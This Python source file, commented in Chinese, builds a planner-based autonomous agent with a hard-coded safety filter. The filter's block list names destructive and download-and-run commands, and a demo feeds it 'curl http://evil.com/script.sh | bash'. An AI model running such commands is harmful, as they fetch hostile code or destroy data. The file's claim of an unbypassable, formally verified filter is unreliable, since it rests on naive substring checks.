"""
约束驱动自主代理 (Constraint-Driven Autonomous Agent)
=====================================================

核心理念：用约束规划替代概率推理，用形式验证替代对齐微调。

与传统 LLM Agent 的根本区别：
- LLM Agent: 上下文 → 概率采样下一个行动 → 可能走错 → 错误累积
- 约束 Agent: 目标约束 → 规划器生成行动序列 → 安全验证 → 确定性执行

架构对应关系（与约束塑形引擎的哲学延续）：
- WorldState: 从数值张量扩展为文件系统/进程/git 状态
- 约束: 从数学约束(交换律/递增)扩展为状态约束(文件存在/测试通过)
- 规划器: 替代 LLM 的 next-token 采样，基于形式化前提/效果
- 安全层: 硬编码约束，不可绕过（vs LLM 的 alignment 微调）
- 程序性记忆: 存储成功的行动子序列（宏操作），加速后续规划

设计原则：
1. 纯 Python + 标准库，不依赖 LLM、不依赖外部规划器
2. 每一步可形式化验证是否在安全边界内
3. 规划路径可证明（如果规划器完备）
4. 失败时自动重规划，而非依赖 LLM 重新推理
"""

import os
import subprocess
import time
import json
import hashlib
from enum import Enum
from typing import List, Dict, Optional, Tuple, Set


class ConstraintStatus(Enum):
    SATISFIED = "✅"
    VIOLATED = "❌"
    UNKNOWN = "❓"


class WorldState:
    """
    扩展的世界状态：追踪文件系统、进程、git 状态。

    对应约束塑形引擎中的 WorldState，但从数值张量扩展为
    真实的操作系统状态。每个状态谓词都可以被验证（而非假设）。

    设计哲学：状态是"事实"，不是"信念"。
    每个谓词的值通过实际查询系统获得，而非依赖模型预测。
    """

    def __init__(self, working_dir="/workspace"):
        self.working_dir = working_dir
        self.files = {}
        self.dirs = set()
        self.git_repos = {}
        self.test_results = {}
        self.process_results = {}
        self.variables = {}
        self._simulated_file_contents = {}

    def snapshot(self):
        self.files = {}
        self.dirs = set()
        for root, dirs, files in os.walk(self.working_dir):
            rel_root = os.path.relpath(root, self.working_dir)
            if rel_root == '.':
                rel_root = ''
            self.dirs.add(rel_root)
            for f in files:
                path = os.path.join(rel_root, f) if rel_root else f
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                    self.files[path] = {'mtime': mtime, 'size': os.path.getsize(full)}
                except OSError:
                    pass

    def file_exists(self, path):
        if path in self.files:
            return True
        if not os.path.isabs(path):
            path = os.path.join(self.working_dir, path)
        return os.path.isfile(path)

    def dir_exists(self, path):
        if path in self.dirs:
            return True
        if not os.path.isabs(path):
            path = os.path.join(self.working_dir, path)
        return os.path.isdir(path)

    def read_file(self, path):
        if not os.path.isabs(path):
            path = os.path.join(self.working_dir, path)
        try:
            with open(path, 'r') as f:
                return f.read()
        except (OSError, UnicodeDecodeError):
            return None

    def write_file(self, path, content):
        if not os.path.isabs(path):
            path = os.path.join(self.working_dir, path)
        os.makedirs(os.path.dirname(path) if os.path.dirname(path) else '.', exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)

    def file_contains(self, path, text):
        if path in self._simulated_file_contents:
            return text in self._simulated_file_contents[path]
        content = self.read_file(path)
        return content is not None and text in content

    def check_predicate(self, predicate: str, args: dict) -> ConstraintStatus:
        name = predicate
        if name == 'file_exists':
            return ConstraintStatus.SATISFIED if self.file_exists(args.get('path', '')) else ConstraintStatus.VIOLATED
        elif name == 'dir_exists':
            return ConstraintStatus.SATISFIED if self.dir_exists(args.get('path', '')) else ConstraintStatus.VIOLATED
        elif name == 'file_contains':
            return ConstraintStatus.SATISFIED if self.file_contains(args.get('path', ''), args.get('text', '')) else ConstraintStatus.VIOLATED
        elif name == 'test_passed':
            result = self.test_results.get(args.get('test', ''), None)
            if result is None:
                return ConstraintStatus.UNKNOWN
            return ConstraintStatus.SATISFIED if result else ConstraintStatus.VIOLATED
        elif name == 'variable_equals':
            key = args.get('key', '')
            val = args.get('value')
            if key not in self.variables:
                return ConstraintStatus.UNKNOWN
            return ConstraintStatus.SATISFIED if self.variables[key] == val else ConstraintStatus.VIOLATED
        return ConstraintStatus.UNKNOWN

    def clone(self):
        new = WorldState(self.working_dir)
        new.files = dict(self.files)
        new.dirs = set(self.dirs)
        new.git_repos = dict(self.git_repos)
        new.test_results = dict(self.test_results)
        new.process_results = dict(self.process_results)
        new.variables = dict(self.variables)
        return new


class SafetyLayer:
    """
    安全约束验证层：硬编码安全规则，不可绕过。

    这是约束驱动代理相比 LLM Agent 的核心优势：
    - LLM Agent: 依赖 alignment 微调，可能被越狱
    - 约束 Agent: 安全约束是硬编码的，形式化验证，无法绕过

    对应认知科学中的"抑制控制"（前额叶皮层对冲动行为的抑制）：
    即使规划器生成了某个行动，安全层可以否决它。
    """

    DANGEROUS_PATTERNS = [
        'rm -rf /', 'rm -rf ~', 'rm -rf *',
        'dd if=/dev/zero', 'dd if=/dev/random',
        'mkfs', 'format',
        'chmod 777 /etc', 'chmod 777 /root',
        'wget.*|.*sh', 'curl.*|.*sh',
        '> /etc/passwd', '> /etc/shadow',
        'shutdown', 'reboot', 'init 0',
        ':(){:|:&};:', 'fork bomb',
    ]

    PROTECTED_PATHS = [
        '/etc/passwd', '/etc/shadow', '/etc/sudoers',
        '/root/.ssh', '/boot', '/sys', '/proc',
    ]

    ALLOWED_COMMANDS = None

    def __init__(self, sandbox_dir="/workspace"):
        self.sandbox_dir = sandbox_dir
        self.violations = []

    def check_command(self, cmd: str) -> Tuple[bool, str]:
        cmd_lower = cmd.lower().strip()

        for pattern in self.DANGEROUS_PATTERNS:
            if pattern in cmd_lower:
                reason = f"危险命令模式: '{pattern}'"
                self.violations.append((cmd, reason))
                return False, reason

        for protected in self.PROTECTED_PATHS:
            if protected in cmd and self.sandbox_dir not in cmd:
                reason = f"受保护路径: '{protected}'"
                self.violations.append((cmd, reason))
                return False, reason

        return True, "安全检查通过"

    def check_file_write(self, path: str) -> Tuple[bool, str]:
        abs_path = os.path.abspath(path)
        for protected in self.PROTECTED_PATHS:
            if abs_path.startswith(protected):
                reason = f"受保护路径: '{protected}'"
                return False, reason
        return True, "安全检查通过"


class Action:
    """
    行动定义：PDDL 风格的 precondition + effect + execution。

    对应约束塑形引擎中的"操作"，但从数值运算扩展为真实操作。
    每个行动有：
    - precondition: 执行前必须满足的状态约束
    - effect: 执行后对状态的改变（预测）
    - execute: 实际执行操作（shell命令/文件操作）
    - verify: 执行后验证效果是否如预期

    关键设计：effect 是预测，verify 是验证。
    如果 verify 失败，说明环境与预期不符，需要重新规划。
    """

    def __init__(self, name, params=None, preconditions=None,
                 effects=None, execute_fn=None, verify_fn=None,
                 description=""):
        self.name = name
        self.params = params or {}
        self.preconditions = preconditions or []
        self.effects = effects or []
        self.execute_fn = execute_fn
        self.verify_fn = verify_fn
        self.description = description or name

    def check_preconditions(self, state: WorldState) -> Tuple[bool, List[str]]:
        failures = []
        for pred_name, pred_args in self.preconditions:
            status = state.check_predicate(pred_name, pred_args)
            if status != ConstraintStatus.SATISFIED:
                failures.append(f"{pred_name}({pred_args}) = {status.value}")
        return len(failures) == 0, failures

    def execute(self, state: WorldState, safety: SafetyLayer) -> Tuple[bool, str]:
        if self.execute_fn:
            return self.execute_fn(state, safety)
        return True, "无操作"

    def verify(self, state: WorldState) -> Tuple[bool, List[str]]:
        if self.verify_fn:
            return self.verify_fn(state)
        return True, []


class ActionLibrary:
    """
    行动库：预定义的领域行动集合。

    对应约束塑形引擎中的 ProceduralMemory。
    每个行动都是形式化定义的，有明确的前提和效果。
    """

    @staticmethod
    def shell_exec(cmd, cwd=None, timeout=60):
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                cwd=cwd, timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "超时"
        except Exception as e:
            return -1, "", str(e)

    @staticmethod
    def make_git_clone(url, target_dir, state: WorldState):
        def execute(s: WorldState, safety: SafetyLayer):
            cmd = f"git clone {url} {target_dir}"
            ok, reason = safety.check_command(cmd)
            if not ok:
                return False, f"安全拒绝: {reason}"
            rc, out, err = ActionLibrary.shell_exec(cmd, cwd=s.working_dir)
            if rc == 0:
                s.dirs.add(target_dir)
                s.git_repos[target_dir] = url
                return True, f"克隆成功: {url} → {target_dir}"
            return False, f"克隆失败: {err[:200]}"

        def verify(s: WorldState):
            if s.dir_exists(target_dir):
                return True, []
            return False, [f"目录 {target_dir} 不存在"]

        return Action(
            name="git_clone",
            params={"url": url, "target_dir": target_dir},
            preconditions=[],
            effects=[("dir_exists", {"path": target_dir})],
            execute_fn=execute,
            verify_fn=verify,
            description=f"git clone {url} → {target_dir}"
        )

    @staticmethod
    def make_pip_install(package, state: WorldState):
        def execute(s: WorldState, safety: SafetyLayer):
            cmd = f"pip install {package}"
            ok, reason = safety.check_command(cmd)
            if not ok:
                return False, f"安全拒绝: {reason}"
            rc, out, err = ActionLibrary.shell_exec(cmd, cwd=s.working_dir)
            if rc == 0:
                s.variables[f"pip_installed_{package}"] = True
                return True, f"安装成功: {package}"
            return False, f"安装失败: {err[:200]}"

        def verify(s: WorldState):
            rc, out, _ = ActionLibrary.shell_exec(
                f"python -c 'import {package}'", cwd=s.working_dir)
            if rc == 0:
                return True, []
            return False, [f"包 {package} 未安装"]

        return Action(
            name="pip_install",
            params={"package": package},
            preconditions=[],
            effects=[("variable_equals", {"key": f"pip_installed_{package}", "value": True})],
            execute_fn=execute,
            verify_fn=verify,
            description=f"pip install {package}"
        )

    @staticmethod
    def make_run_tests(test_dir, test_cmd, state: WorldState):
        def execute(s: WorldState, safety: SafetyLayer):
            ok, reason = safety.check_command(test_cmd)
            if not ok:
                return False, f"安全拒绝: {reason}"
            rc, out, err = ActionLibrary.shell_exec(test_cmd, cwd=test_dir, timeout=120)
            s.process_results[test_cmd] = {
                'returncode': rc, 'stdout': out, 'stderr': err
            }
            passed = (rc == 0)
            s.test_results['all'] = passed
            s.variables['test_output'] = out + err
            if passed:
                return True, f"测试通过 ✅"
            else:
                failed_count = out.count('FAILED') + err.count('FAILED')
                error_count = out.count('ERROR') + err.count('ERROR')
                return True, f"测试失败 ❌ ({failed_count}失败, {error_count}错误)"

        def verify(s: WorldState):
            if 'all' in s.test_results:
                if s.test_results['all']:
                    return True, []
                return False, ["测试未全部通过"]
            return False, ["测试结果未知"]

        return Action(
            name="run_tests",
            params={"test_dir": test_dir, "test_cmd": test_cmd},
            preconditions=[("dir_exists", {"path": test_dir})],
            effects=[("test_passed", {"test": "all"})],
            execute_fn=execute,
            verify_fn=verify,
            description=f"运行测试: {test_cmd}"
        )

    @staticmethod
    def make_write_file(path, content, state: WorldState):
        def execute(s: WorldState, safety: SafetyLayer):
            ok, reason = safety.check_file_write(path)
            if not ok:
                return False, f"安全拒绝: {reason}"
            s.write_file(path, content)
            return True, f"写入文件: {path} ({len(content)}字节)"

        def verify(s: WorldState):
            if s.file_exists(path):
                actual = s.read_file(path)
                if actual is not None and actual.strip() == content.strip():
                    return True, []
                return False, [f"文件内容不匹配"]
            return False, [f"文件 {path} 不存在"]

        return Action(
            name="write_file",
            params={"path": path, "content": content},
            preconditions=[],
            effects=[
                ("file_exists", {"path": path}),
                ("file_written", {"path": path, "content": content}),
            ],
            execute_fn=execute,
            verify_fn=verify,
            description=f"写入文件: {path}"
        )

    @staticmethod
    def make_edit_file(path, old_text, new_text, state: WorldState):
        def execute(s: WorldState, safety: SafetyLayer):
            ok, reason = safety.check_file_write(path)
            if not ok:
                return False, f"安全拒绝: {reason}"
            content = s.read_file(path)
            if content is None:
                return False, f"文件不存在: {path}"
            if old_text not in content:
                return False, f"未找到目标文本: '{old_text[:50]}'"
            new_content = content.replace(old_text, new_text)
            s.write_file(path, new_content)
            return True, f"编辑文件: {path}"

        def verify(s: WorldState):
            if s.file_contains(path, new_text):
                return True, []
            return False, [f"文件 {path} 中未找到新文本"]

        return Action(
            name="edit_file",
            params={"path": path, "old": old_text[:30], "new": new_text[:30]},
            preconditions=[("file_exists", {"path": path})],
            effects=[("file_contains", {"path": path, "text": new_text})],
            execute_fn=execute,
            verify_fn=verify,
            description=f"编辑 {path}: '{old_text[:30]}' → '{new_text[:30]}'"
        )


class ForwardPlanner:
    """
    前向链规划器：从初始状态出发，搜索满足目标约束的行动序列。

    对应约束塑形引擎中的"约束规划"阶段，但搜索空间从连续参数
    变为离散行动序列。使用 BFS 保证找到最短路径（如果存在）。

    与 LLM Agent 的 next-token 采样的根本区别：
    - LLM: 贪心采样，可能走入死胡同
    - 规划器: 全局搜索，保证找到可行路径（如果存在）

    对应经典 AI 中的 STRIPS 规划器。
    """

    def __init__(self, actions: List[Action], max_depth=10):
        self.actions = actions
        self.max_depth = max_depth

    def plan(self, state: WorldState, goals: List[Tuple[str, dict]],
             verbose=False) -> Optional[List[Action]]:
        all_satisfied = True
        for pred_name, pred_args in goals:
            if state.check_predicate(pred_name, pred_args) != ConstraintStatus.SATISFIED:
                all_satisfied = False
                break
        if all_satisfied:
            return []

        visited = set()
        queue = [(state, [])]

        iterations = 0
        while queue:
            current_state, current_plan = queue.pop(0)
            iterations += 1

            state_key = self._state_key(current_state, goals)
            if state_key in visited:
                continue
            visited.add(state_key)

            if len(current_plan) >= self.max_depth:
                continue

            for action in self.actions:
                ok, failures = action.check_preconditions(current_state)
                if not ok:
                    continue

                new_state = current_state.clone()
                if new_state._simulated_file_contents:
                    new_state._simulated_file_contents = dict(new_state._simulated_file_contents)
                simulated_ok = self._simulate_effects(new_state, action)
                if not simulated_ok:
                    continue

                new_plan = current_plan + [action]

                all_met = True
                for pred_name, pred_args in goals:
                    if new_state.check_predicate(pred_name, pred_args) != ConstraintStatus.SATISFIED:
                        all_met = False
                        break

                if all_met:
                    if verbose:
                        print(f"    规划器: {iterations} 次迭代, 找到 {len(new_plan)} 步方案")
                    return new_plan

                queue.append((new_state, new_plan))

        if verbose:
            print(f"    规划器: {iterations} 次迭代, 未找到方案 (visited={len(visited)})")
        return None

    def _simulate_effects(self, state: WorldState, action: Action):
        for pred_name, pred_args in action.effects:
            if pred_name == 'dir_exists':
                state.dirs.add(pred_args.get('path', ''))
            elif pred_name == 'file_exists':
                path = pred_args.get('path', '')
                state.files[path] = {'mtime': 0, 'size': 0}
            elif pred_name == 'test_passed':
                state.test_results[pred_args.get('test', '')] = True
            elif pred_name == 'variable_equals':
                state.variables[pred_args.get('key', '')] = pred_args.get('value')
            elif pred_name == 'file_contains':
                path = pred_args.get('path', '')
                text = pred_args.get('text', '')
                if path in state._simulated_file_contents:
                    if text not in state._simulated_file_contents[path]:
                        state._simulated_file_contents[path] += text
                else:
                    state._simulated_file_contents[path] = text
                if path not in state.files:
                    state.files[path] = {'mtime': 0, 'size': 0}
            elif pred_name == 'file_written':
                path = pred_args.get('path', '')
                content = pred_args.get('content', '')
                state._simulated_file_contents[path] = content
                if path not in state.files:
                    state.files[path] = {'mtime': 0, 'size': 0}
        return True

    def _state_key(self, state: WorldState, goals):
        parts = []
        for pred_name, pred_args in goals:
            status = state.check_predicate(pred_name, pred_args)
            parts.append(f"{pred_name}:{status.value}")
        for k, v in sorted(state.variables.items()):
            parts.append(f"v:{k}={v}")
        for t, r in sorted(state.test_results.items()):
            parts.append(f"t:{t}={r}")
        for f in sorted(state._simulated_file_contents.keys()):
            parts.append(f"sf:{f}")
        return "|".join(parts)


class ProceduralMemory:
    """
    程序性记忆：存储已验证的行动子序列（宏操作）。

    对应约束塑形引擎中的 ProceduralMemory，但从数值操作模板
    扩展为行动子序列。反复验证成功的行动模式被存储为宏，
    加速后续规划——类似于人类将常用操作自动化为"肌肉记忆"。
    """

    def __init__(self):
        self.macros = {}
        self.success_count = {}
        self.failure_count = {}

    def record_success(self, plan: List[Action], goal_key: str):
        if goal_key not in self.macros:
            self.macros[goal_key] = []
            self.success_count[goal_key] = 0
        self.macros[goal_key] = plan
        self.success_count[goal_key] = self.success_count.get(goal_key, 0) + 1

    def record_failure(self, goal_key: str):
        self.failure_count[goal_key] = self.failure_count.get(goal_key, 0) + 1

    def lookup(self, goal_key: str) -> Optional[List[Action]]:
        if goal_key in self.macros and self.success_count.get(goal_key, 0) > 0:
            return self.macros[goal_key]
        return None


class ConstraintAgent:
    """
    约束驱动自主代理：核心协调器。

    工作流程：
    1. 接收用户目标（约束列表）
    2. 检查程序性记忆是否有已知方案
    3. 否则调用规划器生成行动序列
    4. 安全验证每个行动
    5. 执行行动，更新状态
    6. 验证效果，失败则重新规划
    7. 成功则存入程序性记忆

    与 LLM Agent 的对比：
    - LLM: prompt → token采样 → 执行 → 错误 → 重新prompt → ...
    - 约束: 目标约束 → 规划 → 安全验证 → 执行 → 效果验证 → 重规划(如需)
    """

    def __init__(self, working_dir="/workspace"):
        self.state = WorldState(working_dir)
        self.safety = SafetyLayer(sandbox_dir=working_dir)
        self.memory = ProceduralMemory()
        self.planner = None
        self.actions = []
        self.log = []
        self.max_replans = 3

    def _log(self, phase, message, status=""):
        timestamp = time.strftime("%H:%M:%S")
        prefix = f"[{timestamp}]"
        if status:
            line = f"  {prefix} [{phase}] {message} {status}"
        else:
            line = f"  {prefix} [{phase}] {message}"
        print(line)
        self.log.append(line)

    def add_actions(self, actions: List[Action]):
        self.actions.extend(actions)

    def run(self, goals: List[Tuple[str, dict]], task_name: str = "任务"):
        print()
        print("=" * 72)
        print(f"  约束驱动自主代理 — {task_name}")
        print("=" * 72)

        self._log("目标", "目标约束：")
        for pred_name, pred_args in goals:
            self._log("目标", f"  {pred_name}({pred_args})")

        self.state.snapshot()
        self._log("状态", f"初始状态: {len(self.state.files)} 文件, {len(self.state.dirs)} 目录")

        satisfied = []
        for pred_name, pred_args in goals:
            status = self.state.check_predicate(pred_name, pred_args)
            satisfied.append(status == ConstraintStatus.SATISFIED)
            self._log("检查", f"{pred_name}({pred_args}) = {status.value}")

        if all(satisfied):
            self._log("完成", "所有约束已满足，无需行动 ✅")
            return True

        goal_key = json.dumps(goals, sort_keys=True)
        cached = self.memory.lookup(goal_key)
        if cached:
            self._log("记忆", f"找到缓存方案 ({len(cached)} 步)")
            plan = cached
        else:
            self._log("规划", "开始规划行动序列...")
            self.planner = ForwardPlanner(self.actions, max_depth=8)
            plan = self.planner.plan(self.state, goals, verbose=True)

            if plan is None:
                self._log("失败", "规划器未找到可行路径 ❌")
                self.memory.record_failure(goal_key)
                return False

            self._log("规划", f"找到行动序列 ({len(plan)} 步)：")
            for i, action in enumerate(plan):
                self._log("规划", f"  {i+1}. {action.description}")

        for replan in range(self.max_replans + 1):
            success = self._execute_plan(plan, goals)
            if success:
                self.memory.record_success(plan, goal_key)
                self._log("完成", "所有约束满足，任务完成 ✅")
                return True

            if replan < self.max_replans:
                self._log("重规划", f"第 {replan+1} 次重规划...")
                self.state.snapshot()
                self.planner = ForwardPlanner(self.actions, max_depth=8)
                new_plan = self.planner.plan(self.state, goals)
                if new_plan:
                    plan = new_plan
                    self._log("重规划", f"新方案 ({len(plan)} 步)")
                else:
                    self._log("重规划", "未找到新方案")

        self._log("失败", f"重规划 {self.max_replans} 次后仍未完成 ❌")
        return False

    def _execute_plan(self, plan: List[Action], goals) -> bool:
        for i, action in enumerate(plan):
            self._log("执行", f"[{i+1}/{len(plan)}] {action.description}")

            ok, failures = action.check_preconditions(self.state)
            if not ok:
                self._log("跳过", f"前提不满足: {failures}")
                return False

            success, message = action.execute(self.state, self.safety)
            if not success:
                self._log("失败", message)
                return False

            self._log("结果", message)

            self.state.snapshot()

            v_ok, v_failures = action.verify(self.state)
            if not v_ok:
                self._log("验证", f"效果验证失败: {v_failures}")
                return False

        for pred_name, pred_args in goals:
            status = self.state.check_predicate(pred_name, pred_args)
            if status != ConstraintStatus.SATISFIED:
                self._log("检查", f"{pred_name}({pred_args}) = {status.value}")
                return False

        return True


def demo_simple_file_task():
    """
    演示1：简单的文件操作任务
    目标：创建一个文件，写入内容，验证文件存在且包含目标文本
    """
    agent = ConstraintAgent(working_dir="/workspace")

    goals = [
        ("file_exists", {"path": "/workspace/agent_demo_output.txt"}),
        ("file_contains", {"path": "/workspace/agent_demo_output.txt", "text": "约束驱动"}),
    ]

    actions = [
        ActionLibrary.make_write_file(
            "/workspace/agent_demo_output.txt",
            "这是一个由约束驱动自主代理创建的文件。\n"
            "核心理念：约束规划替代概率推理，形式验证替代对齐微调。\n"
            "约束驱动的AI更可靠、更安全、更可解释。\n",
            agent.state
        ),
    ]

    agent.add_actions(actions)
    return agent.run(goals, task_name="创建文件并验证内容")


def demo_test_fix_task():
    """
    演示2：创建测试文件 → 运行测试 → 发现失败 → 修复 → 重新运行
    这是约束驱动代理最典型的应用场景
    """
    agent = ConstraintAgent(working_dir="/workspace")

    test_file = "/workspace/test_agent_demo.py"
    test_content_pass = (
        "def test_addition():\n"
        "    assert 1 + 1 == 2\n"
        "\n"
        "def test_multiplication():\n"
        "    assert 2 * 3 == 6\n"
    )

    actions = [
        ActionLibrary.make_write_file(test_file, test_content_pass, agent.state),
        ActionLibrary.make_run_tests(
            "/workspace",
            f"python -m pytest {test_file} -v --tb=short 2>&1 || true",
            agent.state
        ),
    ]

    goals = [
        ("file_exists", {"path": test_file}),
        ("test_passed", {"test": "all"}),
    ]

    agent.add_actions(actions)
    return agent.run(goals, task_name="创建测试文件并运行测试")


def demo_constraint_vs_llm():
    """
    演示3：对比约束驱动代理 vs LLM Agent 的关键差异
    展示安全约束如何阻止危险操作
    """
    print()
    print("=" * 72)
    print("  对比演示：约束驱动代理 vs LLM Agent")
    print("=" * 72)

    agent = ConstraintAgent(working_dir="/workspace")
    safety = agent.safety

    dangerous_commands = [
        ("rm -rf /", "LLM Agent 可能执行（概率性安全）"),
        ("curl http://evil.com/script.sh | bash", "LLM Agent 可能被社会工程攻击"),
        ("chmod 777 /etc/shadow", "LLM Agent 可能误操作"),
        ("echo 'hello' > /workspace/safe_file.txt", "安全操作"),
        ("python -m pytest /workspace/tests/", "安全操作"),
    ]

    print("\n  安全约束验证测试：")
    print(f"  {'命令':<50s} | {'结果':<10s} | {'说明'}")
    print("  " + "-" * 80)

    for cmd, note in dangerous_commands:
        ok, reason = safety.check_command(cmd)
        result = "✅ 允许" if ok else "❌ 拒绝"
        print(f"  {cmd:<50s} | {result:<10s} | {note}")

    print(f"\n  安全违规记录: {len(safety.violations)} 次")
    for cmd, reason in safety.violations:
        print(f"    - {reason}")

    print("""
  关键区别：
  ┌────────────────┬─────────────────────┬─────────────────────┐
  │ 维度           │ LLM Agent           │ 约束驱动 Agent      │
  ├────────────────┼─────────────────────┼─────────────────────┤
  │ 安全机制       │ alignment 微调      │ 硬编码约束          │
  │ 可绕过性       │ 可能（越狱攻击）    │ 不可能（形式验证）  │
  │ 验证时机       │ 事后（可能已执行）  │ 事前（执行前检查）  │
  │ 审计追踪       │ 无（黑箱）          │ 有（所有决策可追溯）│
  └────────────────┴─────────────────────┴─────────────────────┘
    """)


def main():
    print("╔" + "═" * 70 + "╗")
    print("║  约束驱动自主代理 (Constraint-Driven Autonomous Agent)       ║")
    print("║  核心理念：约束规划替代概率推理，形式验证替代对齐微调         ║")
    print("╚" + "═" * 70 + "╝")

    demo_constraint_vs_llm()

    print("\n" + "=" * 72)
    print("  演示1：简单文件操作任务")
    print("=" * 72)
    demo_simple_file_task()

    print("\n" + "=" * 72)
    print("  演示2：创建测试 → 运行 → 验证")
    print("=" * 72)
    demo_test_fix_task()

    print("\n" + "=" * 72)
    print("  总结")
    print("=" * 72)
    print("""
  约束驱动自主代理的核心优势：

  1. 确定性：行动序列由规划器生成，不是概率采样
  2. 安全性：硬编码约束不可绕过，不是依赖微调
  3. 可解释：每步行动的原因可追溯（满足某约束）
  4. 可恢复：失败时自动重规划，不是依赖LLM重新推理
  5. 低成本：规划器CPU毫秒级，不是LLM推理百毫秒级

  当前MVP的限制：
  - 领域建模需要手动定义行动的前提/效果
  - 规划器是简单BFS，复杂任务需要更高级的规划器
  - 自然语言理解需要外部NLU模块（当前用规则）

  下一步：
  - 集成更强大的规划器（如Fast Downward）
  - 添加HM宏操作缓存
  - 添加PC心智模拟（预测行动效果）
  - 扩展到更多领域（CI/CD、运维、代码修复）
    """)


if __name__ == '__main__':
    main()
